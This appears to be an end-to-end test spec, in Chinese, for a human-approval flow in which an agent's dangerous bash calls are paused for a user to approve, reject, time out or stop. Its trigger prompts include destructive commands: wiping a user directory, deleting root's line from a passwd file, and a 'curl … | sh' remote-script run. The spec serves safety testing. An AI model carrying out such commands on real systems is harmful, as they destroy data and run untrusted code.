# E2E: 高危工具人工审批 (Human in the Loop)

对应改动:
- 后端:`mooc-manus/internal/domains/models/interrupt/`、`internal/domains/models/events/interrupt.go`、`internal/domains/services/agents/base.go` (InvokeToolCalls 中断分支)、`internal/applications/services/agent.go` (`pendingInterrupts` + `Resume`)、`api/handlers/agent.go` (`Resume` handler) + `api/routers/route.go`
- 前端:`mooc-manus-web/src/api/sse.ts` (订阅 `tool_call_interrupt`)、`src/api/modules/agent.ts` (`resumeAgent`)、`src/components/InterruptCard/InterruptCard.tsx`、对话窗渲染集成
- 设计文档:`docs/superpowers/specs/2026-07-12-human-in-the-loop-design.md`
- 实施计划:`docs/superpowers/plans/2026-07-12-human-in-the-loop.md`

**验证目标**:主 LLM 在 `bashExec` schema 里给出 `risk_level=dangerous` 时,后端 park Agent goroutine、发出 `tool_call_interrupt` SSE 事件,前端渲染审批卡片;用户点"执行" / "拒绝" / 超时 5min / Stop 四条路径,均能正确闭环。

## 前置

- 后端 `http://localhost:8080` 已起(`cd mooc-manus && go run cmd/main.go`)
- 前端 `http://localhost:3000` 已起(`cd mooc-manus-web && pnpm dev --port 3000 --strictPort`)
- 后端日志文件存在且可读:`mooc-manus/logs/manus.log` (用例 1/2/3/5 强制断言)
- 数据库里至少存在 1 条可用 AppConfig,配好有效 LLM 凭证 + 装配 `native` 工具集(至少含 `bashExec`) + 允许改 systemPrompt
- **E2E-04 专用**:后端 `WaitTimeout` 已通过环境变量 `HITL_WAIT_TIMEOUT=10s` 或对应配置项调低到 10s;跑完用例 4 需要恢复(见"清理"段)
- Chromium 无遗留登录 / 会话(每用例开头 `browser_snapshot` 校准)

**Playwright MCP 权限**(需已批准):
`browser_navigate` / `browser_wait_for` / `browser_snapshot` / `browser_click` / `browser_type` / `browser_console_messages` / `browser_network_requests` / `browser_take_screenshot` / `browser_evaluate`

## 通用工作方式 (CC 必须遵守)

1. 每个用例开始前先 `browser_snapshot` 拿 aria tree,别盲点
2. 交互后用 `browser_wait_for(text=..., time?=<秒>)` 等具体文本 / 元素出现,禁止固定 sleep
3. 每个判定单独 assert;判定失败立刻 `browser_take_screenshot` 存 `tmp/e2e/case-<N>-fail.png` 后继续跑下一个用例
4. Network 断言用 `browser_network_requests`:
   - SSE 断言过滤 `POST /api/agent/chat`;body 是原始 SSE 文本流,需要按 `\n\n` 拆帧、按 `event:` / `data:` 解析
   - Resume 断言过滤 `POST /api/agent/resume`;body 是标准 JSON,读 `status` 字段
5. Console 断言用 `browser_console_messages`,过滤 `error` 级
6. **后端日志断言**:必要时 `bash: tail -n 400 mooc-manus/logs/manus.log | grep -E "action=register|action=resolve|MsgUserStop|InterruptCard"`;把命中行原文存 `tmp/e2e/case-<N>-log.txt`
7. 每个用例结束打印一行:`[用例 N] pass / fail: <原因>`
8. **严格单跑**,失败不重试(重试掩盖 flake)
9. **不允许启动服务、不允许 `go run` / `pnpm dev`**;服务未起 → 报错让用户处理

## SSE 事件参考

前端订阅的事件类型 (`mooc-manus-web/src/api/sse.ts:11-23`):
```
message / message_end / tool_call_start / tool_call_complete / tool_call_fail /
tool_call_interrupt / error / done / title / plan_create_success /
step_start / step_complete
```

`tool_call_interrupt` payload 关键字段(见 `mooc-manus-web/src/types/sse.ts:48-58` 与 `mooc-manus/internal/domains/models/events/interrupt.go`):
```jsonc
{
  "type": "tool_call_interrupt",
  "tool_call_id": "<toolCallId>",
  "tool_name": "native",
  "function_name": "bashExec",
  "function_args": "<原始 JSON 字符串,含 command/risk_level/risk_reason>",
  "risk_level": "dangerous",
  "risk_reason": "<LLM 给出的说明>",
  "status": "interrupted"
}
```

Resume 请求 (`POST /api/agent/resume`) 契约:
```jsonc
// request
{ "messageId": "...", "toolCallId": "...", "decision": "approve" | "reject", "feedback": "可选" }
// response
{ "status": "accepted" | "already_decided" | "not_found" }
// HTTP: accepted=200 / already_decided=409 / not_found=404 / binding error=400
```

## 前端可见元素锚点

InterruptCard 组件(`mooc-manus-web/src/components/InterruptCard/InterruptCard.tsx`) 关键可视文本,供 `browser_wait_for` 与 `browser_snapshot` 定位:

| 状态 | 关键文本 |
|------|----------|
| pending | `高危调用待审批` / `风险原因` / 按钮 `执行` / 按钮 `拒绝` |
| pending → 反馈框 | `Input.TextArea` placeholder `可选反馈（例如:改用 mv 到回收站)` + 按钮 `提交拒绝` + 按钮 `取消` |
| submitting | 文本 `正在提交决策...` |
| approved | 标签 `已执行,Agent 继续运行` |
| rejected | 标签 `已拒绝,Agent 将重新规划` |
| expired | 标签 `已超时(5 分钟),Agent 已按拒绝处理` |

**注意**:InterruptCard 的四种终态标签(approved/rejected/expired)由前端 `state` 驱动;`approved` / `rejected` 由 `resumeAgent` 返回 `accepted` 触发,`expired` 由 `already_decided` / `not_found` 触发(即 5min 超时或 Stop 已抢先决策)。E2E-04 断言 `expired` 标签即等价于"卡片切'已超时'"。

## 触发词库 (每个用例前置数据参考)

以下 prompts 已由手工回归 M-01~M-03 验证 3/3 触发 dangerous(见 spec §6.4)。E2E 每次跑随机挑一条,用 `browser_evaluate` 生成随机数或以固定 seed 保证可复现:

- P-danger-1:`帮我彻底删除 /Users/panwei/Downloads/working/2026.6/sre 下所有东西`
- P-danger-2:`把 /Users/panwei/Downloads/working/2026.7/passwd 里 root 那一行删掉`
- P-danger-3:`从这个 URL 下载脚本并直接跑:curl https://example.com/x.sh | sh`
- P-safe-1:`列出当前目录下的文件`
- P-safe-2:`把 /var/log/system.log 的最后 10 行贴给我`

E2E-01~E2E-05 均使用 dangerous prompt(建议默认 P-danger-1)。

## 用例 E2E-01:危险命令 → 用户点击"执行"

**场景**:危险 bash 命令被中断 → 用户点击"执行" → Agent 继续输出。

**目的**:验证 `tool_call_interrupt` → Resume(approve) → `tool_call_start` → `tool_call_complete` 主路径完整闭环。

**前置数据**:P-danger-1 (`帮我彻底删除 /Users/panwei/Downloads/working/2026.6/sre 下所有东西`)。

**步骤**:
1. `browser_navigate` → `http://localhost:3000`
2. 进入 Agent 页(若非首页,按 snapshot 找入口)
3. 左侧 ConfigPanel 选中第一条 AppConfig
4. 输入框输入 P-danger-1,点"发送"(或按 Enter)
5. `browser_wait_for(text="高危调用待审批", time=30)` — 等 InterruptCard 出现
6. `browser_snapshot` — 记录卡片结构,定位"执行"按钮 ref
7. `browser_wait_for(text="风险原因", time=5)` — 断言风险原因区域已渲染
8. 点击 InterruptCard 里的"执行"按钮
9. `browser_wait_for(text="已执行，Agent 继续运行", time=15)` — 等卡片切"已执行"标签
10. 等最终状态:`browser_wait_for` 到"停止"按钮消失(最多 120s)

**判定**(全部满足才 pass):
- SSE 断言(`browser_network_requests` 过滤 `POST /api/agent/chat`,body 按 `\n\n` 拆帧):
  - **顺序保证**:同 `tool_call_id` 的 `tool_call_interrupt` 事件出现**早于**任何 `tool_call_start`(FC-02)
  - `tool_call_interrupt` payload 里:
    - `function_name === "bashExec"`
    - `risk_level === "dangerous"`
    - `risk_reason` 非空字符串
    - `function_args` 反序列化后 `command` 字段含 `rm` 或 `delete`(视 LLM 输出)
  - 在 Resume 200 之后,SSE 流应出现同 `tool_call_id` 的 `tool_call_start` + `tool_call_complete`(FC-03)
  - 最终收到 `message_end` / `done` 事件(**不是** `error`)
- Resume 请求断言(过滤 `POST /api/agent/resume`):
  - status=200
  - request body 里 `decision === "approve"`、`toolCallId` 与 `tool_call_interrupt.tool_call_id` 一致
  - response body `status === "accepted"`
- UI 断言:
  - InterruptCard 底部标签文本为 `已执行，Agent 继续运行`(green success 色)
  - "执行" / "拒绝" 按钮均已消失
- `browser_console_messages` 无 `error` 级

**清理**:点"新建会话",确保下一用例干净起手。

**判定示例(SSE 解析伪代码,在 `browser_evaluate` 里跑)**:
```js
const chatReq = requests.find(r => r.url.endsWith('/api/agent/chat') && r.method === 'POST');
const raw = chatReq.responseBody;
const frames = raw.split(/\n\n/).filter(Boolean).map(f => {
  const event = f.match(/^event:\s*(.+)$/m)?.[1];
  const data = f.match(/^data:\s*(.+)$/m)?.[1];
  return { event, data: data ? JSON.parse(data) : null };
}).filter(x => x.event);

const interruptIdx = frames.findIndex(x => x.event === 'tool_call_interrupt');
const firstStartIdx = frames.findIndex(x => x.event === 'tool_call_start');
assert(interruptIdx >= 0 && interruptIdx < firstStartIdx, 'interrupt must precede first tool_call_start');

const interrupt = frames[interruptIdx].data;
assert(interrupt.function_name === 'bashExec');
assert(interrupt.risk_level === 'dangerous');
assert(interrupt.risk_reason?.length > 0);

const tcid = interrupt.tool_call_id;
const startAfter = frames.slice(interruptIdx + 1).some(x => x.event === 'tool_call_start' && x.data.tool_call_id === tcid);
const completeAfter = frames.slice(interruptIdx + 1).some(x => x.event === 'tool_call_complete' && x.data.tool_call_id === tcid);
assert(startAfter && completeAfter);
```

## 用例 E2E-02:危险命令 → 用户点击"拒绝"(无反馈)

**场景**:危险 bash 命令被中断 → 用户点击"拒绝",反馈框展开但**不填任何内容**直接提交 → 卡片切"已拒绝" → Agent 拿到 reject tool result 重新规划。

**目的**:验证 Resume(reject, feedback="") 路径:同 `tool_call_id` 后续**不再**执行、下一轮 LLM 拿到 `MsgUserReject` 后自主收敛。

**前置数据**:P-danger-1 (`帮我彻底删除 /Users/panwei/Downloads/working/2026.6/sre 下所有东西`)。

**步骤**:
1. 新建会话或 `browser_navigate` 硬刷新到 `/`
2. 选中第一条 AppConfig
3. 输入 P-danger-1,点"发送"
4. `browser_wait_for(text="高危调用待审批", time=30)`
5. `browser_snapshot`,记录"拒绝"按钮 ref
6. 点击 InterruptCard 里的"拒绝"按钮
7. `browser_wait_for(text="提交拒绝", time=5)` — 等反馈 TextArea + "提交拒绝"按钮出现
8. `browser_snapshot` — 断言反馈框已展开(placeholder 含"改用 mv 到回收站")
9. **不填任何反馈**,直接点"提交拒绝"
10. `browser_wait_for(text="已拒绝，Agent 将重新规划", time=15)`
11. 等"停止"按钮消失(最多 120s)

**判定**:
- SSE 断言:
  - 出现 `tool_call_interrupt` 事件(function_name=bashExec, risk_level=dangerous)
  - Resume 之后,SSE 流里**不出现**同 `tool_call_id` 的 `tool_call_start`(FC-04)
  - 后续 LLM 至少输出一条 `message`,内容体现"改用其他方式"或"需要确认"或"取消操作"等收敛语义(允许 LLM 自主表达,不硬绑关键词)
  - 最终收到 `message_end` / `done`,不是 `error`
- Resume 请求断言:
  - status=200,`response.status === "accepted"`
  - request body 里 `decision === "reject"`
  - **`feedback` 字段不存在或为 `undefined`**(InterruptCard 逻辑:`feedback.trim() || undefined`,空字符串被规约成 undefined)
- UI 断言:InterruptCard 底部标签文本 `已拒绝，Agent 将重新规划`(default 色)
- 后端日志断言:`grep -F "action=resolve" mooc-manus/logs/manus.log | tail -n 5` 至少 1 行含 `decision=reject` 且 `source=user`
- `browser_console_messages` 无 `error` 级

**清理**:点"新建会话"。

## 用例 E2E-03:危险命令 → 用户点击"拒绝"(带反馈)

**场景**:危险 bash 命令被中断 → 用户点击"拒绝",在反馈框输入"改用 mv 到回收站",提交 → 后端 tool result 包含反馈原文,并把反馈透传给 LLM。

**目的**:验证 D4 决策(拒绝携带反馈)——Resume payload 携带 feedback,后端按 `MsgUserRejectWithFeedbackTpl` 组装 tool result,下一轮 LLM 上下文含反馈原文并按其调整策略。

**前置数据**:P-danger-1;反馈文本固定为 `改用 mv 到回收站`。

**步骤**:
1. 新建会话或硬刷新
2. 选中第一条 AppConfig
3. 输入 P-danger-1,点"发送"
4. `browser_wait_for(text="高危调用待审批", time=30)`
5. 点"拒绝"按钮 → 反馈框展开
6. `browser_wait_for(text="可选反馈", time=5)`
7. 在反馈 TextArea 输入:`改用 mv 到回收站`(用 `browser_type` 一次填入)
8. `browser_snapshot`,确认输入已生效
9. 点"提交拒绝"
10. `browser_wait_for(text="已拒绝，Agent 将重新规划", time=15)`
11. 等"停止"按钮消失(最多 120s)

**判定**:
- Resume 请求 body 里:
  - `decision === "reject"`
  - `feedback === "改用 mv 到回收站"`(**关键**:非 undefined、非空,精确等值)
  - status=200,`response.status === "accepted"`
- SSE 断言:
  - 出现 `tool_call_interrupt`
  - Resume 之后**不出现**同 `tool_call_id` 的 `tool_call_start`
  - 后续 LLM 输出的 assistant `message` 至少一条命中以下关键词之一:`mv` / `回收站` / `移动` / `改用`(EF-03,允许 LLM 用中英文表达等价含义)
- 后端 tool result 断言(通过日志或后端补测):
  - `grep -F "改用 mv 到回收站" mooc-manus/logs/manus.log` 至少 1 行(证明 feedback 已写入 tool message content)
  - 若日志脱敏则以"下一轮 assistant message 命中关键词"作为间接证据(SSE 层已可验证)
- UI 断言:InterruptCard 底部标签 `已拒绝，Agent 将重新规划`
- console 无 `error`

**清理**:点"新建会话"。

## 用例 E2E-04:危险命令 → 5 分钟内不操作(超时)

**场景**:危险 bash 命令被中断,用户放着不管;5 分钟(或调低后的 10s)后后端 Timer fire → 按拒绝分支收敛 → 前端卡片切"已超时"。

**目的**:验证 D3(超时策略)+ FC-06(超时按拒绝处理)+ EF-04(超时体验)。

**⚠️ 前置**:后端必须先把 `WaitTimeout` 调低。推荐两种方式(任选其一,不许改代码):
- 环境变量:`HITL_WAIT_TIMEOUT=10s go run cmd/main.go`
- 或通过配置文件把对应配置项设置为 10s

**若无法调低超时,则本用例需 300s 挂机等待,不建议在自动跑 pipeline 里默认启用**;可用标签 `@slow` 跳过。

**前置数据**:P-danger-1;超时窗口:12s(留 2s 安全余量)。

**步骤**:
1. 确认后端已启动且 `WaitTimeout=10s`(可通过启动日志 grep `WaitTimeout` 或 `curl /healthz` 附带诊断字段确认;若无诊断接口,请前置通过服务日志核对)
2. 新建会话或硬刷新
3. 选中第一条 AppConfig
4. 输入 P-danger-1,点"发送"
5. `browser_wait_for(text="高危调用待审批", time=30)`
6. **不点任何按钮**,不切 tab,保持前端连接活着
7. `browser_wait_for(text="已超时（5 分钟）", time=20)` — 等卡片切"已超时"标签(超时后前端首次点击按钮或后端主动推 tool_call_fail/message 均会触发 UI 状态更新;若前端不主动重取则以后端 SSE 后续事件为准,详见判定段)
8. 等"停止"按钮消失(最多 60s)

**判定**:
- 后端日志断言:`grep -F "action=resolve" mooc-manus/logs/manus.log | tail -n 10` 至少 1 行含 `decision=timeout` 或 `source=timer`(具体字段以实现为准,验收前先跑 I-03 集成测试对照日志格式)
- SSE 断言:
  - 出现 `tool_call_interrupt`
  - Resume 之后**未收到** Resume 请求(用户无操作)
  - Timer fire 之后,SSE 流应出现:
    - **不出现**同 `tool_call_id` 的 `tool_call_start`(FC-06)
    - 后续 LLM 输出的 assistant `message` 命中关键词之一:`未确认` / `超时` / `未获授权` / `暂不执行` / `请再次确认`(EF-04)
  - 最终收到 `message_end` / `done`,不是 `error`
- UI 断言:
  - InterruptCard 底部标签为 `已超时（5 分钟），Agent 已按拒绝处理`(warning 色)
  - **注**:该状态需前端在超时后主动尝试 Resume(用户点了按钮才会收到 `already_decided`);若纯"用户放着不动"仅靠后端 push,前端展示仍为 pending。**因此本用例判定核心以 SSE + 后端日志为准**;UI 层为可选强断言,若无 UI 切换,先在断言里记 warn 不 fail,待前端补齐"服务端推超时事件"再收紧
- `browser_console_messages` 无 `error` 级

**清理**:
- 点"新建会话"
- **必须**:恢复后端 `WaitTimeout` 到默认 5min(重启后端或改回 env),避免污染 E2E-01~E2E-03、E2E-05 的默认超时预期

## 用例 E2E-05:危险命令中断 → 用户点击 Stop

**场景**:危险 bash 命令被中断,pending 卡片渲染;用户不点执行 / 拒绝,而是点底部红色"停止"按钮 → 后端 Stop 路径把 pending 清理,补齐孤儿 `assistant.tool_calls` 的 `MsgUserStop` tool result,Agent goroutine 通过 `ctx.Done` 退出。

**目的**:验证 FC-07(Stop 联动清理)+ D8(memory 一致性)+ Stop/Resume/Timer 三方竞态里 Stop 抢先的分支。

**前置数据**:P-danger-1;Stop 时机:InterruptCard 出现后 1s 内(在用户还没点执行 / 拒绝之前)。

**步骤**:
1. 新建会话或硬刷新
2. 选中第一条 AppConfig
3. 输入 P-danger-1,点"发送"
4. `browser_wait_for(text="高危调用待审批", time=30)`
5. `browser_snapshot`,同时确认底部有红色"停止"按钮(streaming 中)
6. 点击底部红色"停止"按钮(**不是** InterruptCard 里的按钮)
7. `browser_wait_for(textGone="停止", time=10)` — 等"停止"按钮消失
8. `browser_snapshot` — 确认 InterruptCard 变为终态(见判定段)

**判定**:
- Stop 网络断言:`POST /api/agent/message/stop` status=200,response body 里 `cleaned.sse === true`(参考 stop-streaming E2E)
- SSE 断言:
  - 出现 `tool_call_interrupt` 事件
  - Stop 之后**不出现**同 `tool_call_id` 的 `tool_call_start`
  - SSE 通道被服务端主动 close(前端不应再收到 `message` / `done` 事件;`browser_evaluate` 里检查 EventSource / fetch reader 状态)
- 后端断言(日志强断言):
  - `grep -F "action=resolve" mooc-manus/logs/manus.log | tail -n 5` 至少 1 行含 `source=stop` 或 `decision=stop`(字段以实现为准)
  - `grep -F "用户中止了本次对话" mooc-manus/logs/manus.log` 至少 1 行(证明 `MsgUserStop` 已经写入 memory / tool message)
  - Agent goroutine 已退出:`grep -E "goroutine.*exit|ctx.Done|Chat return" mooc-manus/logs/manus.log | tail -n 3` 有对应记录(具体日志文本以后端实现为准,失败时保留原文供 debug)
- UI 断言:
  - InterruptCard 卡片保持可见(不清空),按钮已 disabled
  - "停止"按钮消失、"发送"按钮 disabled 属性移除
  - 消息列表里最新 assistant 气泡保留可见(用户可以看到 Stop 之前流出的内容)
- `browser_console_messages` 无 `error` 级

**清理**:点"新建会话"。

## 汇总输出格式

```
E2E 汇总: X/5 通过

[用例 E2E-01] pass — approve 主路径:interrupt→start→complete 顺序正确,卡片切"已执行"
[用例 E2E-02] pass — reject 无反馈:Resume decision=reject,无同 tool_call_id 的 start,卡片切"已拒绝"
[用例 E2E-03] pass — reject 带反馈"改用 mv 到回收站",Resume payload 命中,LLM 下一条回复含 mv/回收站关键词
[用例 E2E-04] pass — 10s 超时(临时配置),SSE 无 start,LLM 收尾语义命中,后端 resolve source=timer
[用例 E2E-05] pass — Stop 抢先:pending 清理 + MsgUserStop 写入 + SSE 通道 close

失败清单:(如有)
  [用例 E2E-N] fail — <一句话原因>
    截图:tmp/e2e/case-N-fail.png
    SSE:tmp/e2e/case-N-sse.txt
    日志:tmp/e2e/case-N-log.txt
```

## 产物落盘

**目录**:`tmp/e2e/`(唯一允许写入的位置,e2e skill 硬约束)

每用例落:
- `tmp/e2e/case-<N>-fail.png` — 失败截图(仅失败用例)
- `tmp/e2e/case-<N>-sse.txt` — 抓到的 SSE 原始流
- `tmp/e2e/case-<N>-console.txt` — 控制台日志
- `tmp/e2e/case-<N>-log.txt` — 后端日志相关行

汇总:`tmp/e2e/report.md`

## 约束

- **禁止修改任何应用代码**,只跑测试(改 spec / `tmp/e2e/` 除外)
- 服务未起 → 报错让用户处理,不要自作主张 `go run` / `pnpm dev`
- 用例之间不复用状态假设,每个用例开头 **新建会话或硬刷新** + `browser_snapshot` 校准
- 失败不重试;重试掩盖 flake,不修问题
- E2E-04 结束**必须**恢复后端 `WaitTimeout` 到默认 5min
- **子模块纪律**:本 spec 落在**总仓** `docs/e2e/`,不写入 `mooc-manus/` 或 `mooc-manus-web/` 子模块目录

## 与集成测试对照

| 用例 | 对应集成测试 (I-01~I-13) | spec §7.1 验收编号 |
|------|--------------------------|---------------------|
| E2E-01 | I-01 主路径 approve | FC-02 / FC-03 |
| E2E-02 | I-02 主路径 reject(无反馈) | FC-04 |
| E2E-03 | I-04 reject 携带 feedback | FC-04 / EF-03 |
| E2E-04 | I-03 超时 | FC-06 / EF-04 |
| E2E-05 | I-07 Stop 联动清理 | FC-07 |

E2E 层只做黑盒断言(SSE + UI + 网络 + 后端日志);细粒度状态、CAS 竞态、pending map 内部行为由集成/单元测试覆盖,E2E 不重复。



